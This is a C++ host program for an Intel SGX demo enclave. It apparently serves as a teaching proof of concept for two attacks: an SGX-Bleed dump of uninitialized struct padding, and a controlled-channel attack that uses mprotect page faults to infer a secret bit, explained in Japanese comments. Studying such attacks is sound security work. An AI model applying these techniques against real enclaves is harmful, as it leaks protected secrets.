#include "Enclave_u.h"
#include "error_print.h"
#include "sgx_error.h"
#include <cstdio>
#include <cstring>
#include <iostream>
#include <sgx_urts.h>
#include <stdio.h>
#include <sys/mman.h>

sgx_enclave_id_t global_eid = 0;

/* OCALL implementations */
void ocall_print_binary(uint8_t *data, size_t data_len) {
  std::cout << "[ocall_print_binary]" << std::endl;
  for (size_t i = 0; i < data_len; i++) {
    if (i != 0 && i % 16 == 0) {
      puts("");
    }

    printf("%02x ", data[i]);
  }

  puts("");

  return;
}

/* Enclave initialization function */
int initialize_enclave() {
  std::string launch_token_path = "enclave.token";
  std::string enclave_name = "enclave.signed.so";
  const char *token_path = launch_token_path.c_str();

  sgx_launch_token_t token = {0};
  sgx_status_t status = SGX_ERROR_UNEXPECTED;
  int updated = 0;

  /*==============================================================*
   * Step 1: Obtain enclave launch token                          *
   *==============================================================*/

  /* If exist, load the enclave launch token */
  FILE *fp = fopen(token_path, "rb");

  /* If token doesn't exist, create the token */
  if (fp == NULL && (fp = fopen(token_path, "wb")) == NULL) {
    /* Storing token is not necessary, so file I/O errors here
     * is not fatal
     */
    std::cerr << "Warning: Failed to create/open the launch token file ";
    std::cerr << "\"" << launch_token_path << "\"." << std::endl;
  }

  if (fp != NULL) {
    /* read the token from saved file */
    size_t read_num = fread(token, 1, sizeof(sgx_launch_token_t), fp);

    /* if token is invalid, clear the buffer */
    if (read_num != 0 && read_num != sizeof(sgx_launch_token_t)) {
      memset(&token, 0x0, sizeof(sgx_launch_token_t));

      /* As aforementioned, if token doesn't exist or is corrupted,
       * zero-flushed new token will be used for launch.
       * So token error is not fatal.
       */
      std::cerr << "Warning: Invalid launch token read from ";
      std::cerr << "\"" << launch_token_path << "\"." << std::endl;
    }
  }

  /*==============================================================*
   * Step 2: Initialize enclave by calling sgx_create_enclave     *
   *==============================================================*/

  status = sgx_create_enclave(enclave_name.c_str(), SGX_DEBUG_FLAG, &token,
                              &updated, &global_eid, NULL);

  if (status != SGX_SUCCESS) {
    /* Defined at error_print.cpp */
    sgx_error_print(status);

    if (fp != NULL) {
      fclose(fp);
    }

    return -1;
  }

  /*==============================================================*
   * Step 3: Save the launch token if it is updated               *
   *==============================================================*/

  /* If there is no update with token, skip save */
  if (updated == 0 || fp == NULL) {
    if (fp != NULL) {
      fclose(fp);
    }

    return 0;
  }

  /* reopen with write mode and save token */
  fp = freopen(token_path, "wb", fp);
  if (fp == NULL)
    return 0;

  size_t write_num = fwrite(token, 1, sizeof(sgx_launch_token_t), fp);

  if (write_num != sizeof(sgx_launch_token_t)) {
    std::cerr << "Warning: Failed to save launch token to ";
    std::cerr << "\"" << launch_token_path << "\"." << std::endl;
  }

  fclose(fp);

  return 0;
}

int do_sgx_bleed() {
  std::cout << "Executing do_sgx_bleed()" << std::endl;
  test_struct_t ts;
  sgx_status_t status = sgx_bleed(global_eid, &ts);
  sgx_error_print(status);
  uint64_t *ptr = (uint64_t *)&ts;
  size_t size = sizeof(ts) / 8;
  std::cout << "Display structure values" << std::endl;
  for (size_t i = 0; i < size; i++) {
    printf("0x%016lx\n", ptr[i]);
  }

  return 0;
}

/*
 * secretが128未満かそれ以上かを推測する攻撃
 * 予め静的解析等でsecretが128未満の場合と128以上の場合それぞれで、どちらへアクセスするかは分かっているものとする
 * あとはどちらかをmprotectでアクセス不可にして、sgx_status_tがクラッシュを返すかどうかでsecretを推測する
 * 例えば、randが128未満ならptr2にアクセスし、128以上ならptr4にアクセスするのが今回の攻撃対象
 * ここで、ptr2をPROT_NONEにしておくと、SGX_SUCCESSならrandが128以上(secret=1)であり、CRASHEDならrandが128未満(secret=0)であると分かるという攻撃
 */
int do_controlled_channel_attack() {
  std::cout << "Executing do_controlled_channel_attack()" << std::endl;
  uint64_t address1;
  uint64_t address2;

  std::cout << "Executing init_controlled_channel_attack()" << std::endl;
  sgx_status_t status =
      init_controlled_channel_attack(global_eid, &address1, &address2);
  sgx_error_print(status);

  printf("ptr1: 0x%lx\n", address1);
  printf("ptr2: 0x%lx\n", address2);

  uint64_t min_adr, mprot_adr;

  if (address1 < address2) {
    min_adr = address1;
  } else {
    min_adr = address2;
  }

  mprot_adr = min_adr & ~0xFFF;

  uint64_t len = min_adr - mprot_adr + 0x1000;
  printf("0x%lx\n", mprot_adr);
  mprotect((void *)mprot_adr, 0x1000, PROT_NONE);

  status = controlled_channel_attack(global_eid);
  sgx_error_print(status);

  return 0;
}

void print_blank() { printf("\n\n\n"); }

int main() {
  /* initialize enclave */
  if (initialize_enclave() < 0) {
    std::cerr << "App: fatal error: Failed to initialize enclave.";
    std::cerr << std::endl;
    return -1;
  }

  do_sgx_bleed();
  print_blank();
  do_controlled_channel_attack();

  /* Destruct the enclave */
  sgx_destroy_enclave(global_eid);

  return 0;
}
